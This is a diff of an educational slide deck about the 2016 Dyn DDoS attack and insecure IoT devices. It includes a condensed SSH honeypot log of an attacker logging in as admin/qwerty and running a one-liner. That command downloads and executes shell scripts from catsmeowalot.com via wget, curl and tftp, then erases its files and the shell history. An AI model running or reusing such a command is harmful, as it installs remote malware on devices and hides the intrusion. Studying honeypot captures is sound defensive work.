@@ -10,7 +10,11 @@
 
 #VSLIDE
 
-> Early Friday morning, Dyn, a company that provides Domain Name Servers (DNS) for a lot of heavily trafficked websites and services, came under a massive Distributed Denial of Service (DDoS) attack. This has disrupted access to many sites for people across the U.S. Yes, it’s why your Spotify app is offline, why you can’t stream Netflix, and why Twitter won’t load. 
+> Early Friday morning, Dyn, a company that provides Domain Name Servers (DNS) for a 
+> lot of heavily trafficked websites and services, came under a massive Distributed 
+> Denial of Service (DDoS) attack. This has disrupted access to many sites for people 
+> across the U.S. Yes, it’s why your Spotify app is offline, why you can’t stream Netflix, 
+> and why Twitter won’t load. 
 
 #HSLIDE
 
@@ -42,9 +46,7 @@ ns5.spotify.com.        300     IN      A       194.68.28.185
 
 #VSLIDE?image=media/46.png
 
-#VSLIDE
-
-
+#VSLIDE?image=media/dyn-network-map.png
 
 #HSLIDE
 
@@ -52,41 +54,23 @@ ns5.spotify.com.        300     IN      A       194.68.28.185
 
 "connecting any device with an on and off switch to the Internet (and/or to each other). This includes everything from cellphones, coffee makers, washing machines, headphones, lamps, wearable devices and almost anything else you can think of.  This also applies to components of machines, for example a jet engine of an airplane or the drill of an oil rig."
 
-.. what about Artificial cardiac pacemaker?
+__... what about artificial cardiac pacemaker?__
 
 #HSLIDE
 
-2016-10-28 05:00:46+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] admin trying auth password
-2016-10-28 05:00:46+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] login attempt [admin/qwerty] succeeded
-2016-10-28 05:00:49+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] admin authenticated with password
-2016-10-28 05:00:49+0200 [SSHService ssh-userauth on HoneyPotTransport,913,125.17.68.42] starting service ssh-connection
-2016-10-28 05:00:49+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] channel open
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] executing command "cd /tmp; wget http://catsmeowalot.com/lmao.sh || curl -O http://catsmeowalot.com/lmao.sh; chmod 777 lmao.sh; sh lmao.sh; busybox tftp catsmeowalot.com -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g catsmeowalot.com; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf lmao.sh tftp1.sh tftp2.sh; cd; rm -rf ./bash_history; history -c"
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Opening TTY Log: log/tty/20161028-050050-abab97cc-0e.log
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] CMD: cd /tmp; wget http://catsmeowalot.com/lmao.sh || curl -O http://catsmeowalot.com/lmao.sh; chmod 777 lmao.sh; sh lmao.sh; busybox tftp catsmeowalot.com -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g catsmeowalot.com; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf lmao.sh tftp1.sh tftp2.sh; cd; rm -rf ./bash_history; history -c
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: cd /tmp
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: wget http://catsmeowalot.com/lmao.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Starting factory <HTTPProgressDownloader: http://catsmeowalot.com/lmao.sh>
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: curl -O http://catsmeowalot.com/lmao.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: chmod 777 lmao.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: sh lmao.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: busybox tftp catsmeowalot.com -c get tftp1.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: chmod 777 tftp1.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: sh tftp1.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: busybox tftp -r tftp2.sh -g catsmeowalot.com
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: chmod 777 tftp2.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command not found: sh tftp2.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: rm -rf lmao.sh tftp1.sh tftp2.sh
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: cd
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: rm -rf ./bash_history
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Command found: history -c
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] exitCode: 0
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] sending request exit-status
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] sending close 0
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] exitCode: 0
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] received eof, sending ctrl-d to command
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] Closing TTY Log: log/tty/20161028-050050-abab97cc-0e.log after 0 seconds
-2016-10-28 05:00:50+0200 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,913,125.17.68.42] honeypot terminal protocol connection lost disconnected
+```
+2016-10-28 05:00:46+0200 admin trying auth password
+2016-10-28 05:00:46+0200 login attempt [admin/qwerty] succeeded
+2016-10-28 05:00:49+0200 admin authenticated with password
+2016-10-28 05:00:50+0200 executing command "cd /tmp; wget http://catsmeowalot.com/lmao.sh || curl -O
+http://catsmeowalot.com/lmao.sh; chmod 777 lmao.sh; sh lmao.sh; busybox tftp catsmeowalot.com 
+-c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g catsmeowalot.com; 
+chmod 777 tftp2.sh; sh tftp2.sh; rm -rf lmao.sh tftp1.sh tftp2.sh; cd; 
+rm -rf ./bash_history; history -c"
+2016-10-28 05:00:50+0200 Command found: history -c
+2016-10-28 05:00:50+0200 Closing TTY Log: log/tty/20161028-050050-abab97cc-0e.log after 0 seconds
+2016-10-28 05:00:50+0200 honeypot terminal protocol connection lost disconnected
+```
 
 #HSLIDE
 
